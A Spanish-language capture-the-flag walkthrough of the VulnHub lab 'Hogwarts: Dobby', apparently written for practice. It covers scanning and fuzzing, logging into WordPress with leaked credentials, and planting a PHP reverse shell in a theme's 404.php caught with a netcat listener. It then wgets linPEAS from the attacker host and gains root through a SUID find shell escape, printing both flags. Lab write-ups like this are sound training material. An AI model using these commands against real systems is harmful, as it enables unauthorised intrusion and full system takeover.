<h1 align="center">
<br>
  <img src="http://pm1.narvii.com/6428/fb6021f8782bf80369c95fb2940fb77feb9813d0_00.jpg" alt="Front-End Checklist" width="250">
  <br>
  Hogwarts: Dobby
  <br>
</h1>

<h4 align="center">Maquina creada por <img src="https://img.icons8.com/android/344/twitter.png" alt="Front-End Checklist" width="12">@BertrandLorent9</h4>
<h4 align="center">Aquí puedes descargarte la <a href="https://www.vulnhub.com/entry/hogwarts-dobby,597/">máquina</a> y ver una descripción de ella</h4>

---

# Índice

- [Recopilación de información](#recopilación-de-información)
  - [Nmap](#nmap)
  - [Fuzz](#fuzz)
- [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades)
  - [Wordpress](#wordpress)
- [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades)
  - [Reverse Shell](#reverse-shell)
- [Post-explotación](#post-explotación)
  - [Foothold](#foothold)
  - [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades-1)
       - [Linpeas](#linpeas)
  - [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades-1)
       - [SUID](#suid)
- [Información Adicional](#información-adicional)


---

## Recopilación de información

Aquí veremos que esta conectado a la subred, los puerto abiertos, las paginas web, etc.

### Nmap

Veremos que redes estan conectadas a esta subred con este comando:

```nmap -sP 192.168.221.0/24```

Para ver los puertos abiertos que tiene la red utilizaremos este comando:

```nmap -sV -sC 192.168.221.5```

### Fuzz

Para fuzzear la web usaremos este comando con una wordlist que tengamos:

```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.5/FUZZ```

> ⚠️ Importante poner FUZZ alfinal de la URL

Buscando y rebuscando encontramos unas cuantas webs:

* http://192.168.221.5/log
```
#pass:OjppbGlrZXNvY2tz --> ilikesocks
hint --> /DiagonAlley
```
* http://192.168.221.5/alohomora/
```
Draco's password is his house ;)
```
> **slytherin es la casa de Draco Malfoy**

El siguiente ffuf sera para **/DiagonAlley** y descubriremos que es un Wordpress

```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.5/DiagonAlley/FUZZ```

## Búsqueda de vulnerabilidades

### Wordpress

Al ver que tenemos un wordpress probamos las credenciales de **draco** como usuario y **slytherin** como contraseña

Explorando podemos ver que podemos editar el **404.php** --> **Editor** --> **Temas en Apariencia**

## Explotación de vulnerabilidades

### Reverse Shell

He utilizado esta [página web](https://www.hackingarticles.in/wordpress-reverse-shell/) para entender como explotar esta vulnerabilidad.

Ademas añado esta otra [página](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) para la reverse shell de php

> Modificar lo necesario de la reverse shell

Lo que procederemos ha hacer es añadir la reverse shell en el texto del **404.php**

Antes de ejecutar la url pondremos el comando para abrir el puerto puesto en la reverse shell:

```rlwrap nc -nvlp 4444```

La url es esta: ```http://192.168.221.5/DiagonAlley/wp-content/themes/amphibious/404.php```

Posteriormente a esto, haremos que la shell sea interactiva con este comando:

```python3 -c 'import pty; pty.spawn("/bin/bash")'```

## Post-explotación

### Foothold

Nos conectaremos al usuario **dobby** con este comando:

```su dobby```

> La contraseña la hemos sacado anteriormente que es esta **ilikesocks**

Buscaremos la primera flag en el usuario dobby, en esta maquina no podemos utilizar **cat** para leer archivos, asi que he optado por usar el comando **less**

Aquí tenemos la primera flag: **flag1{28327a4964cb391d74111a185a5047ad}**

## Búsqueda de vulnerabilidades

### Linpeas

Utilizaremos el [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) para enumerar las possibles vulnerabilidades que puede tener ese sistema para la escalada de privilegios.

Para enviar el [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) con http usaremos esta forma:

En el **Server/Local** pondremos este comando: ```sudo python3 -m http.server 80```

En el **Cliente/Remota/Victima** pondremos este comando: ```wget 192.168.221.4/linpeas.sh```

## Explotación de vulnerabilidades

### SUID

Una de las mayores vulnerabilidades encontrada por el [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) es la escalda de privilegios con el **/usr/bin/find**

He utilizado esta [página web](https://gtfobins.github.io/gtfobins/find/#suid) para sacar un payload con la funcion de bypasear la seguridad y conseguir el root

Pondremos este comando sacado de la anterior página web:

```/usr/bin/find . -exec /bin/sh -p \; -quit```

Y aquí tenemos la segunda flag:
```
                                         _ __
        ___                             | '  \
   ___  \ /  ___         ,'\_           | .-. \        /|
   \ /  | |,'__ \  ,'\_  |   \          | | | |      ,' |_   /|
 _ | |  | |\/  \ \ |   \ | |\_|    _    | |_| |   _ '-. .-',' |_   _
// | |  | |____| | | |\_|| |__    //    |     | ,'_`. | | '-. .-',' `. ,'\_
\\_| |_,' .-, _  | | |   | |\ \  //    .| |\_/ | / \ || |   | | / |\  \|   \
 `-. .-'| |/ / | | | |   | | \ \//     |  |    | | | || |   | | | |_\ || |\_|
   | |  | || \_| | | |   /_\  \ /      | |`    | | | || |   | | | .---'| |
   | |  | |\___,_\ /_\ _      //       | |     | \_/ || |   | | | |  /\| |
   /_\  | |           //_____//       .||`      `._,' | |   | | \ `-' /| |
        /_\           `------'        \ |   AND        `.\  | |  `._,' /_\
                                       \|       THE          `.\
                                            _  _  _  _  __ _  __ _ /_
                                           (_`/ \|_)/ '|_ |_)|_ |_)(_
                                           ._)\_/| \\_,|__| \|__| \ _)
                                                           _ ___ _      _
                                                          (_` | / \|\ ||__
                                                          ._) | \_/| \||___


root{63a9f0ea7bb98050796b649e85481845!!}
```

## Información Adicional

Páginas web utilizadas:

- [PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) - Reverse Shell PHP

- [Wordpress Reverse Shell](https://www.hackingarticles.in/wordpress-reverse-shell/) - Explotar la vulnerabilidad del wordpress con un código malicioso

- [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Enumeración de escalada de privilegios local.

- [SUID](https://gtfobins.github.io/gtfobins/find/#suid) - Escalada de privilegios SUID con el find

**[⬆ back to top](#-----hogwarts-dobby-)**
